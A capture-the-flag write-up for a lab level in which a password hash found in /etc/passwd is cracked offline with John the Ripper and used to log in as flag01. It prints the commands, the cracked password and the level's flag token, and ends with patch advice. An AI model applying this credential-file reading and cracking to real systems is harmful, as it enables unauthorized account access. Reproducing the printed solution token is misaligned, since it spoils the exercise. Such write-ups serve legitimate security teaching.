## level01

- **How we found it**

  Inspected `/etc/passwd` and noticed `flag01`'s entry contains a password hash instead of `x`:
  
  ```bash
  grep '^flag01:' /etc/passwd
  # → flag01:42hDRfypTqqnw:3001:3001::/home/flag flag01:/bin/bash
  ```

- **How we exploited it**

	**1.** Extract the hash into a file:

	```bash
	echo 'flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash' > flag01.passwd
	```

	**2.** Run John the Ripper (dictionary or incremental):

	```bash
	john flag01.passwd
	john --show flag01.passwd
	# → flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
	```

	**3.** Switch user and get the flag:
	
	```bash
	su flag01
	# Password: abcdefg
	getflag
	# Check flag. Here is your token: f2av5il02puano7naaf6adaaf

- **Utility of this exerice**

	Demonstrates why password hashes must be kept in /etc/shadow (not world-readable) and how offline cracking works.

- **How to patch**

	- Move all hashes to /etc/shadow and ensure /etc/passwd contains only x placeholders.

	- Enforce strong password policies to make brute‑force/dictionary attacks infeasible.